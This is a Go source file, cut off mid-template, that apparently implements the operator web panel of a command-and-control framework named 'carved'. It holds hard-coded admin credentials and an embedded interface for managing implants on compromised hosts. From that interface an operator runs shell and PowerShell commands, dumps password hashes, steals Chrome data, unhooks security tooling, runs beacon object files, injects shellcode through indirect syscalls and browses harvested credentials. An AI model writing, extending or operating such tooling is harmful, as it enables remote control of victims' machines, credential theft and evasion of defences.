package web

import (
	"crypto/rand"
	"encoding/hex"
	"net/http"
	"sync"
	"time"
)

const (
	DefaultUsername	= "carvedadmin"
	DefaultPassword	= "carvedpassword123"
)

var (
	sessions	= make(map[string]time.Time)
	sessionsLock	sync.RWMutex
)

func GenerateSession() string {
	b := make([]byte, 32)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func ValidateSession(token string) bool {
	sessionsLock.RLock()
	defer sessionsLock.RUnlock()

	expiry, exists := sessions[token]
	if !exists {
		return false
	}
	return time.Now().Before(expiry)
}

func CreateSession(token string) {
	sessionsLock.Lock()
	defer sessionsLock.Unlock()
	sessions[token] = time.Now().Add(24 * time.Hour)
}

func DeleteSession(token string) {
	sessionsLock.Lock()
	defer sessionsLock.Unlock()
	delete(sessions, token)
}

func GetSessionFromRequest(r *http.Request) string {
	cookie, err := r.Cookie("session")
	if err != nil {
		return ""
	}
	return cookie.Value
}

func Panel() string {
	return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>carved</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600&display=swap" rel="stylesheet">
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

:root {
  --bg: #0a0a0a;
  --bg-secondary: #111111;
  --bg-tertiary: #161616;
  --border: #1f1f1f;
  --text: #e0e0e0;
  --text-dim: #666666;
  --accent: #ffffff;
  --success: #4ade80;
  --error: #f87171;
  --warning: #fbbf24;
}

body {
  font-family: 'JetBrains Mono', monospace;
  background: var(--bg);
  color: var(--text);
  min-height: 100vh;
  font-size: 13px;
  line-height: 1.6;
}

/* login */
.login-container {
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  background: 
    radial-gradient(ellipse at 50% 0%, rgba(255,255,255,0.03) 0%, transparent 50%),
    var(--bg);
}

.login-box {
  width: 320px;
  padding: 40px;
  background: var(--bg-secondary);
  border: 1px solid var(--border);
}

.login-title {
  font-size: 24px;
  font-weight: 300;
  letter-spacing: 4px;
  text-align: center;
  margin-bottom: 40px;
  color: var(--accent);
}

.login-input {
  width: 100%;
  padding: 12px 16px;
  margin-bottom: 16px;
  background: var(--bg);
  border: 1px solid var(--border);
  color: var(--text);
  font-family: inherit;
  font-size: 13px;
  outline: none;
  transition: border-color 0.2s;
}

.login-input:focus {
  border-color: var(--text-dim);
}

.login-input::placeholder {
  color: var(--text-dim);
}

.login-btn {
  width: 100%;
  padding: 12px;
  background: var(--accent);
  color: var(--bg);
  border: none;
  font-family: inherit;
  font-size: 12px;
  font-weight: 500;
  letter-spacing: 2px;
  cursor: pointer;
  transition: opacity 0.2s;
  text-transform: lowercase;
}

.login-btn:hover {
  opacity: 0.9;
}

.login-error {
  color: var(--error);
  font-size: 11px;
  margin-bottom: 16px;
  display: none;
}

/* main layout */
.app {
  display: none;
  min-height: 100vh;
}

.header {
  height: 48px;
  background: var(--bg-secondary);
  border-bottom: 1px solid var(--border);
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 24px;
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  z-index: 100;
}

.logo {
  font-size: 14px;
  font-weight: 400;
  letter-spacing: 3px;
  color: var(--accent);
}

.header-right {
  display: flex;
  align-items: center;
  gap: 24px;
}

.header-stat {
  font-size: 11px;
  color: var(--text-dim);
}

.header-stat span {
  color: var(--text);
}

.logout-btn {
  background: none;
  border: 1px solid var(--border);
  color: var(--text-dim);
  padding: 6px 12px;
  font-family: inherit;
  font-size: 11px;
  cursor: pointer;
  transition: all 0.2s;
}

.logout-btn:hover {
  border-color: var(--text-dim);
  color: var(--text);
}

.main {
  display: flex;
  padding-top: 48px;
  min-height: 100vh;
}

.sidebar {
  width: 200px;
  background: var(--bg-secondary);
  border-right: 1px solid var(--border);
  padding: 24px 0;
  position: fixed;
  top: 48px;
  bottom: 0;
  left: 0;
  overflow-y: auto;
}

.nav-item {
  padding: 10px 24px;
  color: var(--text-dim);
  cursor: pointer;
  font-size: 12px;
  transition: all 0.2s;
  border-left: 2px solid transparent;
}

.nav-item:hover {
  color: var(--text);
  background: var(--bg-tertiary);
}

.nav-item.active {
  color: var(--accent);
  border-left-color: var(--accent);
  background: var(--bg-tertiary);
}

.nav-section {
  padding: 16px 24px 8px;
  font-size: 10px;
  color: var(--text-dim);
  letter-spacing: 1px;
  text-transform: uppercase;
}

.content {
  flex: 1;
  margin-left: 200px;
  padding: 24px;
  background: var(--bg);
}

.page {
  display: none;
}

.page.active {
  display: block;
}

.page-title {
  font-size: 18px;
  font-weight: 400;
  margin-bottom: 24px;
  color: var(--accent);
}

/* tables */
.table-container {
  background: var(--bg-secondary);
  border: 1px solid var(--border);
  overflow: hidden;
}

table {
  width: 100%;
  border-collapse: collapse;
}

th {
  text-align: left;
  padding: 12px 16px;
  font-size: 10px;
  font-weight: 500;
  color: var(--text-dim);
  text-transform: uppercase;
  letter-spacing: 1px;
  background: var(--bg-tertiary);
  border-bottom: 1px solid var(--border);
}

td {
  padding: 12px 16px;
  border-bottom: 1px solid var(--border);
  font-size: 12px;
}

tr:last-child td {
  border-bottom: none;
}

tr:hover td {
  background: var(--bg-tertiary);
}

tr.clickable {
  cursor: pointer;
}

.status {
  display: inline-block;
  width: 8px;
  height: 8px;
  border-radius: 50%;
  margin-right: 8px;
}

.status.alive { background: var(--success); }
.status.dead { background: var(--error); }
.status.pending { background: var(--warning); }
.status.complete { background: var(--success); }
.status.error { background: var(--error); }
.status.running { background: var(--warning); animation: pulse 1s infinite; }

@keyframes pulse {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.5; }
}

.elevated {
  color: var(--warning);
}

.badge {
  display: inline-block;
  padding: 2px 8px;
  font-size: 10px;
  border: 1px solid var(--border);
  color: var(--text-dim);
}

.badge.active {
  border-color: var(--success);
  color: var(--success);
}

/* implant detail panel */
.detail-panel {
  display: none;
  position: fixed;
  top: 48px;
  right: 0;
  bottom: 0;
  width: 50%;
  background: var(--bg-secondary);
  border-left: 1px solid var(--border);
  overflow-y: auto;
  z-index: 50;
}

.detail-panel.open {
  display: block;
}

.detail-header {
  padding: 20px 24px;
  border-bottom: 1px solid var(--border);
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.detail-title {
  font-size: 14px;
  color: var(--accent);
}

.close-btn {
  background: none;
  border: none;
  color: var(--text-dim);
  font-size: 20px;
  cursor: pointer;
  padding: 4px 8px;
}

.close-btn:hover {
  color: var(--text);
}

.detail-content {
  padding: 24px;
}

.detail-section {
  margin-bottom: 24px;
}

.detail-section-title {
  font-size: 10px;
  color: var(--text-dim);
  text-transform: uppercase;
  letter-spacing: 1px;
  margin-bottom: 12px;
}

.detail-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 12px;
}

.detail-item {
  padding: 12px;
  background: var(--bg);
  border: 1px solid var(--border);
}

.detail-label {
  font-size: 10px;
  color: var(--text-dim);
  margin-bottom: 4px;
}

.detail-value {
  font-size: 12px;
  color: var(--text);
  word-break: break-all;
}

/* command input */
.command-section {
  margin-top: 24px;
  padding-top: 24px;
  border-top: 1px solid var(--border);
}

.command-row {
  display: flex;
  gap: 12px;
  margin-bottom: 12px;
}

.command-select {
  padding: 10px 12px;
  background: var(--bg);
  border: 1px solid var(--border);
  color: var(--text);
  font-family: inherit;
  font-size: 12px;
  min-width: 140px;
  cursor: pointer;
}

.command-input {
  flex: 1;
  padding: 10px 12px;
  background: var(--bg);
  border: 1px solid var(--border);
  color: var(--text);
  font-family: inherit;
  font-size: 12px;
}

.command-input:focus {
  outline: none;
  border-color: var(--text-dim);
}

.command-btn {
  padding: 10px 20px;
  background: var(--accent);
  color: var(--bg);
  border: none;
  font-family: inherit;
  font-size: 11px;
  font-weight: 500;
  cursor: pointer;
  letter-spacing: 1px;
}

.command-btn:hover {
  opacity: 0.9;
}

/* task output */
.task-list {
  max-height: 400px;
  overflow-y: auto;
}

.task-item {
  padding: 16px;
  background: var(--bg);
  border: 1px solid var(--border);
  margin-bottom: 8px;
}

.task-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 8px;
}

.task-type {
  font-size: 11px;
  font-weight: 500;
  color: var(--accent);
}

.task-time {
  font-size: 10px;
  color: var(--text-dim);
}

.task-output {
  font-size: 11px;
  color: var(--text);
  white-space: pre-wrap;
  word-break: break-all;
  background: var(--bg-tertiary);
  padding: 12px;
  max-height: 400px;
  overflow-y: auto;
  border: 1px solid var(--border);
}

.task-error {
  color: var(--error);
}

/* listeners page */
.action-bar {
  display: flex;
  justify-content: flex-end;
  margin-bottom: 16px;
}

.action-btn {
  padding: 8px 16px;
  background: var(--bg-secondary);
  border: 1px solid var(--border);
  color: var(--text);
  font-family: inherit;
  font-size: 11px;
  cursor: pointer;
  transition: all 0.2s;
}

.action-btn:hover {
  border-color: var(--text-dim);
}

.action-btn.danger:hover {
  border-color: var(--error);
  color: var(--error);
}

.action-btn.success:hover {
  border-color: var(--success);
  color: var(--success);
}

/* modal */
.modal-overlay {
  display: none;
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0,0,0,0.8);
  z-index: 200;
  align-items: center;
  justify-content: center;
}

.modal-overlay.open {
  display: flex;
}

.modal {
  background: var(--bg-secondary);
  border: 1px solid var(--border);
  padding: 32px;
  min-width: 400px;
}

.modal-title {
  font-size: 16px;
  margin-bottom: 24px;
  color: var(--accent);
}

.form-group {
  margin-bottom: 16px;
}

.form-label {
  display: block;
  font-size: 11px;
  color: var(--text-dim);
  margin-bottom: 6px;
}

.form-input {
  width: 100%;
  padding: 10px 12px;
  background: var(--bg);
  border: 1px solid var(--border);
  color: var(--text);
  font-family: inherit;
  font-size: 12px;
}

.form-input:focus {
  outline: none;
  border-color: var(--text-dim);
}

.modal-actions {
  display: flex;
  gap: 12px;
  justify-content: flex-end;
  margin-top: 24px;
}

/* results page */
.results-tabs {
  display: flex;
  gap: 0;
  margin-bottom: 24px;
  border-bottom: 1px solid var(--border);
}

.results-tab {
  padding: 12px 24px;
  background: none;
  border: none;
  color: var(--text-dim);
  font-family: inherit;
  font-size: 12px;
  cursor: pointer;
  border-bottom: 2px solid transparent;
  margin-bottom: -1px;
  transition: all 0.2s;
}

.results-tab:hover {
  color: var(--text);
}

.results-tab.active {
  color: var(--accent);
  border-bottom-color: var(--accent);
}

.results-panel {
  display: none;
}

.results-panel.active {
  display: block;
}

.empty-state {
  text-align: center;
  padding: 60px 20px;
  color: var(--text-dim);
}

.empty-state-icon {
  font-size: 32px;
  margin-bottom: 16px;
  opacity: 0.3;
}

/* scrollbar */
::-webkit-scrollbar {
  width: 6px;
  height: 6px;
}

::-webkit-scrollbar-track {
  background: var(--bg);
}

::-webkit-scrollbar-thumb {
  background: var(--border);
}

::-webkit-scrollbar-thumb:hover {
  background: var(--text-dim);
}

/* utility */
.mono {
  font-family: 'JetBrains Mono', monospace;
}

.truncate {
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  max-width: 200px;
}

/* bofs page */
.bof-layout {
  display: grid;
  grid-template-columns: 1fr 300px;
  gap: 24px;
}

.bof-list-section {
  background: var(--bg-secondary);
  border: 1px solid var(--border);
  padding: 16px;
}

.bof-search {
  margin-bottom: 12px;
}

.bof-list {
  max-height: 500px;
  overflow-y: auto;
}

.bof-item {
  padding: 10px 12px;
  border-bottom: 1px solid var(--border);
  cursor: pointer;
  display: flex;
  justify-content: space-between;
  align-items: center;
  transition: background 0.2s;
}

.bof-item:hover {
  background: var(--bg-tertiary);
}

.bof-item.selected {
  background: var(--bg-tertiary);
  border-left: 2px solid var(--accent);
}

.bof-item:last-child {
  border-bottom: none;
}

.bof-name {
  font-size: 12px;
  color: var(--text);
}

.bof-size {
  font-size: 10px;
  color: var(--text-dim);
}

.bof-execute-section {
  background: var(--bg-secondary);
  border: 1px solid var(--border);
  padding: 16px;
  height: fit-content;
}

/* shellcode page */
.shellcode-layout {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 24px;
}

.shellcode-section {
  background: var(--bg-secondary);
  border: 1px solid var(--border);
  padding: 16px;
}

.shellcode-textarea {
  min-height: 120px;
  resize: vertical;
  font-family: 'JetBrains Mono', monospace;
  font-size: 11px;
}

.shellcode-info {
  margin-top: 12px;
  padding: 8px 12px;
  background: var(--bg);
  border: 1px solid var(--border);
  font-size: 11px;
  color: var(--text-dim);
  min-height: 20px;
}

.method-info {
  margin-top: 8px;
  padding: 8px 12px;
  background: var(--bg);
  border: 1px solid var(--border);
}

.method-desc {
  font-size: 10px;
  color: var(--text-dim);
  line-height: 1.4;
}

/* toast notifications */
.toast-container {
  position: fixed;
  top: 60px;
  right: 24px;
  z-index: 1000;
  display: flex;
  flex-direction: column;
  gap: 8px;
}

.toast {
  padding: 12px 16px;
  background: var(--bg-secondary);
  border: 1px solid var(--border);
  border-left: 3px solid var(--accent);
  font-size: 12px;
  color: var(--text);
  animation: slideIn 0.3s ease;
  max-width: 300px;
}

.toast.success {
  border-left-color: var(--success);
}

.toast.error {
  border-left-color: var(--error);
}

.toast.warning {
  border-left-color: var(--warning);
}

@keyframes slideIn {
  from { transform: translateX(100%); opacity: 0; }
  to { transform: translateX(0); opacity: 1; }
}

@keyframes slideOut {
  from { transform: translateX(0); opacity: 1; }
  to { transform: translateX(100%); opacity: 0; }
}
</style>
</head>
<body>

<!-- toast notifications -->
<div class="toast-container" id="toastContainer"></div>

<!-- login -->
<div class="login-container" id="login">
  <div class="login-box">
    <div class="login-title">carved</div>
    <div class="login-error" id="loginError">invalid credentials</div>
    <input type="text" class="login-input" id="username" placeholder="username" autocomplete="off">
    <input type="password" class="login-input" id="password" placeholder="password">
    <button class="login-btn" onclick="login()">authenticate</button>
  </div>
</div>

<!-- main app -->
<div class="app" id="app">
  <header class="header">
    <div class="logo">carved</div>
    <div class="header-right">
      <div class="header-stat">implants: <span id="implantCount">0</span></div>
      <div class="header-stat">listeners: <span id="listenerCount">0</span></div>
      <button class="logout-btn" onclick="logout()">logout</button>
    </div>
  </header>

  <main class="main">
    <nav class="sidebar">
      <div class="nav-section">operations</div>
      <div class="nav-item active" data-page="implants">implants</div>
      <div class="nav-item" data-page="listeners">listeners</div>
      <div class="nav-item" data-page="bofs">bofs</div>
      <div class="nav-item" data-page="shellcode">shellcode</div>
      <div class="nav-section">data</div>
      <div class="nav-item" data-page="results">results</div>
      <div class="nav-item" data-page="credentials">credentials</div>
    </nav>

    <div class="content">
      <!-- implants page -->
      <div class="page active" id="page-implants">
        <h1 class="page-title">implants</h1>
        <div class="action-bar">
          <button class="action-btn danger" onclick="clearImplants()">clear all</button>
        </div>
        <div class="table-container">
          <table>
            <thead>
              <tr>
                <th>status</th>
                <th>id</th>
                <th>user</th>
                <th>hostname</th>
                <th>os</th>
                <th>pid</th>
                <th>last seen</th>
              </tr>
            </thead>
            <tbody id="implantsTable"></tbody>
          </table>
        </div>
      </div>

      <!-- listeners page -->
      <div class="page" id="page-listeners">
        <h1 class="page-title">listeners</h1>
        <div class="action-bar">
          <button class="action-btn" onclick="showNewListenerModal()">+ new listener</button>
        </div>
        <div class="table-container">
          <table>
            <thead>
              <tr>
                <th>status</th>
                <th>name</th>
                <th>type</th>
                <th>host</th>
                <th>port</th>
                <th>actions</th>
              </tr>
            </thead>
            <tbody id="listenersTable"></tbody>
          </table>
        </div>
      </div>

      <!-- results page -->
      <div class="page" id="page-results">
        <h1 class="page-title">results</h1>
        <div class="results-tabs">
          <button class="results-tab active" data-results="all">all tasks</button>
          <button class="results-tab" data-results="hashdump">hashdump</button>
          <button class="results-tab" data-results="chrome">chrome</button>
          <button class="results-tab" data-results="shell">shell</button>
          <button class="results-tab" data-results="bof">bof</button>
        </div>
        <div class="results-panel active" id="results-all">
          <div id="allResultsList"></div>
        </div>
        <div class="results-panel" id="results-hashdump">
          <div id="hashdumpResultsList"></div>
        </div>
        <div class="results-panel" id="results-chrome">
          <div id="chromeResultsList"></div>
        </div>
        <div class="results-panel" id="results-shell">
          <div id="shellResultsList"></div>
        </div>
        <div class="results-panel" id="results-bof">
          <div id="bofResultsList"></div>
        </div>
      </div>

      <!-- credentials page -->
      <div class="page" id="page-credentials">
        <h1 class="page-title">credentials</h1>
        <div class="table-container">
          <table>
            <thead>
              <tr>
                <th>source</th>
                <th>domain</th>
                <th>username</th>
                <th>secret</th>
                <th>type</th>
              </tr>
            </thead>
            <tbody id="credentialsTable"></tbody>
          </table>
        </div>
      </div>

      <!-- bofs page -->
      <div class="page" id="page-bofs">
        <h1 class="page-title">beacon object files</h1>
        <div class="bof-layout">
          <div class="bof-list-section">
            <div class="detail-section-title">available bofs</div>
            <div class="bof-search">
              <input type="text" class="form-input" id="bofSearch" placeholder="search bofs..." oninput="filterBOFs()">
            </div>
            <div class="bof-list" id="bofList"></div>
          </div>
          <div class="bof-execute-section">
            <div class="detail-section-title">execute bof</div>
            <div class="form-group">
              <label class="form-label">selected bof</label>
              <input type="text" class="form-input" id="selectedBof" readonly placeholder="select a bof from the list">
            </div>
            <div class="form-group">
              <label class="form-label">target implant</label>
              <select class="form-input" id="bofTargetImplant">
                <option value="">select implant...</option>
              </select>
            </div>
            <div class="form-group">
              <label class="form-label">arguments (optional)</label>
              <input type="text" class="form-input" id="bofArgs" placeholder="arg1 arg2 ...">
            </div>
            <button class="command-btn" onclick="executeBOF()" style="width:100%;margin-top:12px">execute</button>
          </div>
        </div>
      </div>

      <!-- shellcode page -->
      <div class="page" id="page-shellcode">
        <h1 class="page-title">shellcode execution</h1>
        <div class="shellcode-layout">
          <div class="shellcode-section">
            <div class="detail-section-title">upload shellcode</div>
            <div class="form-group">
              <label class="form-label">shellcode file (.bin)</label>
              <input type="file" class="form-input" id="shellcodeFile" accept=".bin,.raw,.sc" onchange="handleShellcodeFile(event)">
            </div>
            <div class="form-group">
              <label class="form-label">or paste hex/base64</label>
              <textarea class="form-input shellcode-textarea" id="shellcodeData" placeholder="paste shellcode as hex (4831c0...) or base64"></textarea>
            </div>
            <div class="shellcode-info" id="shellcodeInfo"></div>
          </div>
          <div class="shellcode-section">
            <div class="detail-section-title">execute</div>
            <div class="form-group">
              <label class="form-label">target implant</label>
              <select class="form-input" id="shellcodeTargetImplant">
                <option value="">select implant...</option>
              </select>
            </div>
            <div class="form-group">
              <label class="form-label">injection method</label>
              <select class="form-input" id="shellcodeMethod">
                <option value="indirect">indirect syscall (recommended)</option>
                <option value="enclave">enclave (mscoree heap)</option>
                <option value="once">rtl run once</option>
              </select>
            </div>
            <div class="method-info">
              <div class="method-desc" id="methodDesc">Uses NtAllocateVirtualMemory + RtlCreateUserThread via indirect syscalls</div>
            </div>
            <button class="command-btn" onclick="executeShellcode()" style="width:100%;margin-top:12px">execute shellcode</button>
          </div>
        </div>
      </div>
    </div>
  </main>

  <!-- implant detail panel -->
  <div class="detail-panel" id="detailPanel">
    <div class="detail-header">
      <div class="detail-title" id="detailTitle">implant details</div>
      <button class="close-btn" onclick="closeDetail()">&times;</button>
    </div>
    <div class="detail-content">
      <div class="detail-section">
        <div class="detail-section-title">system info</div>
        <div class="detail-grid" id="detailGrid"></div>
      </div>
      
      <div class="command-section">
        <div class="detail-section-title">execute command</div>
        <div class="command-row">
          <select class="command-select" id="commandType">
            <option value="shell">shell</option>
            <option value="powershell">powershell</option>
            <option value="ls">ls</option>
            <option value="cat">cat</option>
            <option value="cd">cd</option>
            <option value="pwd">pwd</option>
            <option value="ps">ps</option>
            <option value="whoami">whoami</option>
            <option value="env">env</option>
            <option value="hashdump">hashdump</option>
            <option value="chrome">chrome</option>
            <option value="unhook">unhook</option>
            <option value="bof">bof</option>
          </select>
          <input type="text" class="command-input" id="commandArgs" placeholder="arguments (optional)">
          <button class="command-btn" onclick="sendCommand()">execute</button>
        </div>
      </div>

      <div class="detail-section">
        <div class="detail-section-title">task history</div>
        <div class="task-list" id="taskList"></div>
      </div>
    </div>
  </div>
</div>

<!-- new listener modal -->
<div class="modal-overlay" id="newListenerModal">
  <div class="modal">
    <div class="modal-title">new listener</div>
    <div class="form-group">
      <label class="form-label">name</label>
      <input type="text" class="form-input" id="listenerName" placeholder="http-listener">
    </div>
    <div class="form-group">
      <label class="form-label">type</label>
      <select class="form-input" id="listenerType">
        <option value="http">http</option>
      </select>
    </div>
    <div class="form-group">
      <label class="form-label">host</label>
      <input type="text" class="form-input" id="listenerHost" value="0.0.0.0">
    </div>
    <div class="form-group">
      <label class="form-label">port</label>
      <input type="number" class="form-input" id="listenerPort" value="8443">
    </div>
    <div class="modal-actions">
      <button class="action-btn" onclick="closeNewListenerModal()">cancel</button>
      <button class="command-btn" onclick="createListener()">create</button>
    </div>
  </div>
</div>

<script>
let currentImplant = null;
let pollInterval = null;

// auth
async function login() {
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;
  
  try {
    const res = await fetch('/auth/login', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({username, password})
    });
    
    if (res.ok) {
      document.getElementById('login').style.display = 'none';
      document.getElementById('app').style.display = 'block';
      startPolling();
    } else {
      document.getElementById('loginError').style.display = 'block';
    }
  } catch (e) {
    document.getElementById('loginError').style.display = 'block';
  }
}

async function logout() {
  await fetch('/auth/logout', {method: 'POST'});
  stopPolling();
  document.getElementById('app').style.display = 'none';
  document.getElementById('login').style.display = 'flex';
  document.getElementById('username').value = '';
  document.getElementById('password').value = '';
}

async function checkAuth() {
  try {
    const res = await fetch('/auth/check');
    if (res.ok) {
      document.getElementById('login').style.display = 'none';
      document.getElementById('app').style.display = 'block';
      startPolling();
    }
  } catch (e) {}
}

// navigation
document.querySelectorAll('.nav-item').forEach(item => {
  item.addEventListener('click', () => {
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    item.classList.add('active');
    document.getElementById('page-' + item.dataset.page).classList.add('active');
    closeDetail();
  });
});

// results tabs
document.querySelectorAll('.results-tab').forEach(tab => {
  tab.addEventListener('click', () => {
    document.querySelectorAll('.results-tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.results-panel').forEach(p => p.classList.remove('active'));
    tab.classList.add('active');
    document.getElementById('results-' + tab.dataset.results).classList.add('active');
  });
});

// polling
function startPolling() {
  loadData();
  pollInterval = setInterval(loadData, 5000);
}

function stopPolling() {
  if (pollInterval) clearInterval(pollInterval);
}

async function loadData() {
  await Promise.all([
    loadImplants(),
    loadListeners(),
    loadCredentials(),
    loadAllResults(),
    loadBOFs(),
    updateShellcodeImplantSelect()
  ]);
  
  if (currentImplant) {
    loadImplantTasks(currentImplant.id);
  }
}

// api calls
async function api(endpoint) {
  const res = await fetch('/api' + endpoint);
  const data = await res.json();
  return data.success ? data.data : [];
}

async function apiPost(endpoint, body) {
  const res = await fetch('/api' + endpoint, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(body)
  });
  return await res.json();
}

async function apiDelete(endpoint) {
  const res = await fetch('/api' + endpoint, {method: 'DELETE'});
  return await res.json();
}

// implants
async function loadImplants() {
  const implants = await api('/implants') || [];
  document.getElementById('implantCount').textContent = implants.length;
  
  const tbody = document.getElementById('implantsTable');
  if (implants.length === 0) {
    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;color:var(--text-dim);padding:40px">no implants connected</td></tr>';
    return;
  }
  
  tbody.innerHTML = implants.map(i => ` + "`" + `
    <tr class="clickable" onclick="selectImplant('${i.id}')">
      <td><span class="status ${i.alive ? 'alive' : 'dead'}"></span>${i.alive ? 'alive' : 'dead'}</td>
      <td class="truncate">${i.id.substring(0,8)}</td>
      <td>${i.elevated ? '<span class="elevated">*</span>' : ''}${i.username}</td>
      <td>${i.hostname}</td>
      <td>${i.os}/${i.arch}</td>
      <td>${i.pid}</td>
      <td>${formatTime(i.last_seen)}</td>
    </tr>
  ` + "`" + `).join('');
}

async function selectImplant(id) {
  const implants = await api('/implants');
  currentImplant = implants.find(i => i.id === id);
  
  if (!currentImplant) return;
  
  document.getElementById('detailTitle').textContent = currentImplant.username + '@' + currentImplant.hostname;
  
  const grid = document.getElementById('detailGrid');
  grid.innerHTML = ` + "`" + `
    <div class="detail-item"><div class="detail-label">id</div><div class="detail-value">${currentImplant.id}</div></div>
    <div class="detail-item"><div class="detail-label">hostname</div><div class="detail-value">${currentImplant.hostname}</div></div>
    <div class="detail-item"><div class="detail-label">username</div><div class="detail-value">${currentImplant.elevated ? '* ' : ''}${currentImplant.username}</div></div>
    <div class="detail-item"><div class="detail-label">domain</div><div class="detail-value">${currentImplant.domain || '-'}</div></div>
    <div class="detail-item"><div class="detail-label">os</div><div class="detail-value">${currentImplant.os}/${currentImplant.arch}</div></div>
    <div class="detail-item"><div class="detail-label">pid</div><div class="detail-value">${currentImplant.pid}</div></div>
    <div class="detail-item"><div class="detail-label">process</div><div class="detail-value">${currentImplant.process}</div></div>
    <div class="detail-item"><div class="detail-label">sleep</div><div class="detail-value">${currentImplant.sleep}s (${currentImplant.jitter}% jitter)</div></div>
  ` + "`" + `;
  
  await loadImplantTasks(id);
  document.getElementById('detailPanel').classList.add('open');
}

async function loadImplantTasks(id) {
  const tasks = await api('/implants/' + id + '/tasks') || [];
  const list = document.getElementById('taskList');
  
  if (tasks.length === 0) {
    list.innerHTML = '<div class="empty-state">no tasks</div>';
    return;
  }
  
  list.innerHTML = tasks.map(t => ` + "`" + `
    <div class="task-item">
      <div class="task-header">
        <span class="task-type"><span class="status ${t.status}"></span>${t.type}</span>
        <span class="task-time">${formatTime(t.created)}</span>
      </div>
      ${t.output ? ` + "`" + `<div class="task-output">${escapeHtml(decodeOutput(t.output))}</div>` + "`" + ` : ''}
      ${t.error ? ` + "`" + `<div class="task-output task-error">${escapeHtml(t.error)}</div>` + "`" + ` : ''}
    </div>
  ` + "`" + `).join('');
}

function closeDetail() {
  document.getElementById('detailPanel').classList.remove('open');
  currentImplant = null;
}

async function clearImplants() {
  if (!confirm('Clear all implants and their task history?')) return;
  await apiDelete('/implants');
  closeDetail();
  loadImplants();
}

async function sendCommand() {
  if (!currentImplant) return;
  
  const type = document.getElementById('commandType').value;
  const args = document.getElementById('commandArgs').value.trim();
  
  await apiPost('/implants/' + currentImplant.id + '/tasks', {
    type: type,
    args: args ? [args] : []
  });
  
  document.getElementById('commandArgs').value = '';
  setTimeout(() => loadImplantTasks(currentImplant.id), 500);
}

// listeners
async function loadListeners() {
  const listeners = await api('/listeners') || [];
  document.getElementById('listenerCount').textContent = listeners.length;
  
  const tbody = document.getElementById('listenersTable');
  if (listeners.length === 0) {
    tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;color:var(--text-dim);padding:40px">no listeners</td></tr>';
    return;
  }
  
  tbody.innerHTML = listeners.map(l => ` + "`" + `
    <tr>
      <td><span class="badge ${l.active ? 'active' : ''}">${l.active ? 'active' : 'stopped'}</span></td>
      <td>${l.name}</td>
      <td>${l.type}</td>
      <td>${l.host}</td>
      <td>${l.port}</td>
      <td>
        ${l.active 
          ? ` + "`" + `<button class="action-btn danger" onclick="stopListener('${l.id}')">stop</button>` + "`" + `
          : ` + "`" + `<button class="action-btn success" onclick="startListener('${l.id}')">start</button>` + "`" + `}
        <button class="action-btn danger" onclick="deleteListener('${l.id}')">delete</button>
      </td>
    </tr>
  ` + "`" + `).join('');
}

function showNewListenerModal() {
  document.getElementById('newListenerModal').classList.add('open');
}

function closeNewListenerModal() {
  document.getElementById('newListenerModal').classList.remove('open');
}

async function createListener() {
  await apiPost('/listeners', {
    name: document.getElementById('listenerName').value,
    type: document.getElementById('listenerType').value,
    host: document.getElementById('listenerHost').value,
    port: parseInt(document.getElementById('listenerPort').value)
  });
  closeNewListenerModal();
  loadListeners();
}

async function startListener(id) {
  await apiPost('/listeners/' + id + '/start', {});
  loadListeners();
}

async function stopListener(id) {
  await apiPost('/listeners/' + id + '/stop', {});
  loadListeners();
}

async function deleteListener(id) {
  await apiDelete('/listeners/' + id);
  loadListeners();
}

// credentials
async function loadCredentials() {
  const creds = await api('/credentials') || [];
  const tbody = document.getElementById('credentialsTable');
  
  if (creds.length === 0) {
    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--text-dim);padding:40px">no credentials</td></tr>';
    return;
  }
  
  tbody.innerHTML = creds.map(c => ` + "`" + `
    <tr>
      <td>${c.source}</td>
      <td>${c.domain || '-'}</td>
      <td>${c.username}</td>
      <td class="truncate">${c.secret}</td>
      <td>${c.type}</td>
    </tr>
  ` + "`" + `).join('');
}

// results
async function loadAllResults() {
  const implants = await api('/implants') || [];
  let allTasks = [];
  
  for (const implant of implants) {
    const tasks = await api('/implants/' + implant.id + '/tasks') || [];
    tasks.forEach(t => t.implant = implant);
    allTasks = allTasks.concat(tasks.filter(t => t.status === 'complete' || t.status === 'error'));
  }
  
  allTasks.sort((a, b) => new Date(b.created) - new Date(a.created));
  
  renderResults('allResultsList', allTasks);
  renderResults('hashdumpResultsList', allTasks.filter(t => t.type === 'hashdump'));
  renderResults('chromeResultsList', allTasks.filter(t => t.type === 'chrome'));
  renderResults('shellResultsList', allTasks.filter(t => t.type === 'shell' || t.type === 'powershell'));
  renderResults('bofResultsList', allTasks.filter(t => t.type === 'bof'));
}

function renderResults(containerId, tasks) {
  const container = document.getElementById(containerId);
  
  if (tasks.length === 0) {
    container.innerHTML = '<div class="empty-state"><div class="empty-state-icon">○</div>no results yet</div>';
    return;
  }
  
  container.innerHTML = tasks.map(t => ` + "`" + `
    <div class="task-item">
      <div class="task-header">
        <span class="task-type">
